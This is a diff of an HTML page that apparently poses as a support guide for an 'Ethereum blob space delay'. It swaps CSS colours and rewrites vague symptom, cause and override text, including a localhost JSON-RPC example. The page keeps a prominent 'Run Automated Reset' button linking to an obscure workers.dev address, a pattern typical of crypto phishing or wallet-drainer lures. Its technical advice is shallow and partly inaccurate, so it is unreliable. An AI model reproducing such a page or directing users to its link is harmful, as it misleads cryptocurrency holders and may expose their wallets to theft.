@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,41 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to excessive data storage.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay. This delay can cause frustration and impact the overall usability of the network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's limitations on the amount of data that can be stored in a single block, leading to congestion and delays when a large number of transactions require significant storage space.</li>
+<li>The error occurs due to the limited blob space available on the Ethereum network, which can lead to congestion and delays in transaction processing. This limitation is a result of the network's design and the increasing demand for blob space.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions and potentially alleviate congestion: </li>
-<li><code>eth_estimateGas</code> to estimate the gas required for a transaction</li>
-<li><code>eth_sendTransaction</code> with a higher gas price to prioritize the transaction</li>
-<li>Using a custom JSON-RPC request, such as:</li>
+<li>Increase the gas limit to prioritize transaction processing: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '0x...', gas: '0x...'})</code></li>
+<li>Utilize layer 2 scaling solutions to reduce the load on the main network</li>
+<li>Optimize smart contract code to minimize blob space usage</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... sender address ...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... recipient address ...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... value ...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... increased gas limit ...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... increased gas price ...&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and customization options. </p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of Ethereum transaction mechanics</li>
-<li>Access to a JSON-RPC endpoint or an Ethereum client</li>
-<li>Familiarity with gas management and transaction prioritization strategies</li>
+<li>Basic understanding of Ethereum network architecture</li>
+<li>Familiarity with smart contract development and deployment</li>
+<li>Access to a node or provider with sufficient permissions to execute transactions</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
